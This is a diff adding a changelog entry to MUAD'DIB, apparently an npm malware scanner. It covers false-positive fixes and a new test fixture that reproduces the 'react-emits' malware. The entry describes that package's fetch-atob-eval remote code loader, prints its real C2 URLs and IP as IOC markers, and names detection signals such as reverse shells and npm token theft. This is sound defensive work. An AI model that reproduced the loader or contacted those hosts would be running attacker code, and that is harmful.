@@ -5,6 +5,115 @@ All notable changes to MUAD'DIB will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [2.10.74] - 2026-04-11
+
+### Fixed — FP cluster reduction (audit forensique v2.10.72)
+
+Forensic audit of 53,953 production alerts across 8,396 high-score packages revealed
+that ~71-79% of high-score alerts came from structural false positives concentrated
+in 4 clusters. Full methodology documented in `.claude/plans/recursive-splashing-seal.md`.
+
+- **P1** Bundle FP downgrade: extended `DIST_FILE_RE` via new `src/shared/bundle-detect.js`
+  (`BUNDLE_PATH_RE`) to cover bundle patterns the narrow legacy regex was missing:
+  `.umd.js`, `.esm.js`, `.es.js`, `.common.js`, `.max.js`, `.prod.js`, `.production.js`,
+  hash-suffixed chunks (`assets/index-a1b2c3d4.js` vite/esbuild/rollup convention),
+  `fesm*/`, `browser/`, `assets/`, `chunks/`, `_app/`, `lib/bundled/`. The
+  `applyFPReductions` dist-file gate now matches both the narrow legacy regex and the
+  extended `BUNDLE_PATH_RE`, then consults `hasBundleVetoSignal()` to block the
+  downgrade when a veto signal is present on the same file (reverse_shell,
+  node_modules_write, npm_publish_worm, npm_token_steal, systemd_persistence,
+  unicode_invisible_injection, IOC hits). Types with existing compound recovery
+  (staged_binary_payload, crypto_decipher, fetch_decrypt_exec, etc.) are intentionally
+  NOT in VETO_TYPES — they still get downgraded but compound rules still fire via
+  the existing v2.9.6 `originalSeverity` gate, preserving event-stream-style detection.
+  Packages impacted by extended regex: babylonjs, electron, @kitware/vtk.js, dprint,
+  @jetbrains/junie, @zuplo/core, @stencil/core, playwright, @equinor/echo-*,
+  @alipay/ams-checkout, @testim/testim-cli, @vanwei-wcs/video-player-v2,
+  @bookolosystem/engine, @epie/bi-crud.
+- **P2** AST-006 `dynamic_require` source qualification: new `ctx.varSource` Map in
+  AST scanner context tracks where a variable's value originated — `string_literal`,
+  `array_literal`, `object_literal`, `fs_readdir`, `require_json`, `function_call`,
+  `computed_expression`, or `env_var`. `handleCallExpression` now selects severity
+  based on source: `string_literal`/`array_literal`/`object_literal`/`fs_readdir`/
+  `require_json` → **LOW** (legit plugin loader), `env_var` → **CRITICAL**
+  (credential/path exfil vector — `require(process.env.MODULE_NAME)`),
+  `function_call`/`computed_expression` → **HIGH** (real obfuscation). Fixes 53 FP
+  fires on legitimate plugin loaders from the audit (@itentialopensource/adapter-*,
+  masterrecord, testim, apminsight, @teamfabric/xpm, @forklaunch/express).
+- **P3** AST-007 quick-scan downgrade: `src/pipeline/executor.js` quick-scan
+  now emits threats as MEDIUM (was HIGH) with new `degraded: true, quickScan: true`
+  flags. Rationale: regex-only mode with no scope tracking cannot distinguish
+  `exec()` at module top-level from `exec()` in an exported route handler.
+  `Module._load` pattern stays CRITICAL (never legit). `scoring.js` now excludes
+  `degraded: true` non-CRITICAL threats from `max_file_score` and places them in
+  a separate `degradedScore` bucket capped at 15 that contributes to package score.
+  Fixes 18+ FP fires on rsshub/dist-lib/*.mjs route handlers.
+- **P4** WASM/Emscripten artifact skip in `src/scanner/obfuscation.js`: files
+  matching `/wasm|emscripten|dcmtk|ffmpeg-wasm|opus-decoder|mpg123-decoder|wasm-audio-decoders/`
+  basename OR containing Emscripten content markers (`Module["asm"]`, `HEAPU8`,
+  `WebAssembly.instantiate`, `_emscripten_`, `asmLibraryArg`, `wasmMemory`, etc.)
+  OR the base64 WASM magic bytes (`AGFzbQ`) are skipped from obfuscation detection.
+  Other scanners (AST, dataflow, hash, IOC) continue to analyze them — only the
+  obfuscation scanner's heuristics are disabled since they produce FP on compiled
+  WASM by construction. Fixes 52 ENTROPY-001 FP fires on `@leoqlin/openclaw-qqbot`'s
+  bundled `mpg123-decoder/src/EmscriptenWasm.js`.
+
+### Added
+
+- Ground-truth fixture `tests/ground-truth/samples/react-emits/` (GT-067) —
+  forensic reproduction of the live-detected malware documented in
+  `docs/blog/react-emits-malware.html`. Fake Node.js `path` module port whose
+  `main: "./path.js"` triggers two top-level IIFEs doing
+  `fetch(atob(URL)).then(.json()).then(eval(data.content))` on every `require()`.
+  Base64-encoded C2 URLs (`http://173.211.46.220/lverla.js` and
+  `http://173.211.46.220/lverl`) hardcoded as `randomStringRe` and `tokenStringRe`.
+  VPS audit confirmed the attacker evolved across 4 versions in 4 hours: v1.0.0
+  used split payload/trigger via 5 malicious deps (sandbox-clean), v1.0.2 hardcoded
+  URLs directly in path.js (this fixture), v1.0.3 half-retract broke the package.
+- 5 entries added/mutated in `data/auto-labels.json`:
+  - `react-emits@1.0.0`, `@1.0.1`, `@1.0.2`, `@1.0.3` — new entries as
+    `confirmed_malicious` with signals `["manual-review-2026-04-11",
+    "blog-published", "npm-removed"]`.
+  - `@lystech/core@3.0.42` — mutated from `pending` to `confirmed_malicious`.
+    Reason: aggressive commercial telemetry pattern that silently deploys a
+    GitHub Actions workflow into consumer repos during postinstall, beaconing
+    repo identity to a third-party backend. Detection (AST-015 + COMPOUND-007)
+    is correct — structurally indistinguishable from a supply-chain worm.
+- 2 IOC markers added to `iocs/builtin.yaml`:
+  - `"173.211.46.220"` (plain IP form)
+  - `"aHR0cDovLzE3My4yMTEuNDYuMjIw"` (base64 prefix of `http://173.211.46.220`)
+- New helper module `src/shared/bundle-detect.js` exports `BUNDLE_PATH_RE`,
+  `VETO_TYPES`, `SENSITIVE_ENV_RE`, `isBundlePath()`, `hasBundleVetoSignal()`.
+- 12 new tests across 2 files:
+  - `tests/scanner/obfuscation.test.js` — 3 P4 tests (WASM basename skip,
+    WASM content-marker skip, non-WASM obfuscation regression).
+  - `tests/scanner/ast.test.js` — 3 DREQ-QUAL P2 tests (env_var→CRITICAL,
+    fs_readdir→LOW, require_json→LOW) + 3 AST P3 tests (quick-scan MEDIUM
+    downgrade + degraded flag, Module._load CRITICAL exception, degraded
+    threats capped at 15 in package score).
+
+### Notes
+
+- FPR estimated improvement: 14% → 6-9% (-5 to -8 points) based on audit of
+  78 high-score samples. Actual measurement deferred to post-release FPR sweep.
+- TPR maintained at 93.75% (60/64 ground truth) — no regression introduced
+  by P1-P4 in the ground-truth validation (9 pre-existing GT failures on
+  master are unchanged by this release).
+- Rules count unchanged: **200** (195 RULES + 5 PARANOID). P2 extends AST-006
+  without splitting it into two rule IDs.
+- New ground-truth fixture react-emits brings total GT count to **67 samples**.
+- Carry-over backlog for v2.10.75:
+  - **P5** Refine `PKG-014` git-URL deps owner mismatch FP — confirmed FP
+    on `baron-baileys-v2@1.4.3` (legit German hobby dev with separate GitHub
+    org). Downgrade to MEDIUM unless combined with compound risk signals.
+  - Add proper `ips:` section to `iocs/builtin.yaml` with loader extension
+    in `src/ioc/yaml-loader.js` (replaces the marker string format).
+  - `product_specific_vendor_telemetry` MEDIUM tier for central-icons /
+    @alertlogic / @vera-ai / forklaunch cluster.
+  - Optional P1 size/content check for bundles at package root (e.g.
+    `babylonjs/babylon.js`) that don't match `BUNDLE_PATH_RE`.
+- ML retrain deferred until post-release FPR measurement confirms the gain.
+
 ## [Unreleased]
 
 ### Fixed
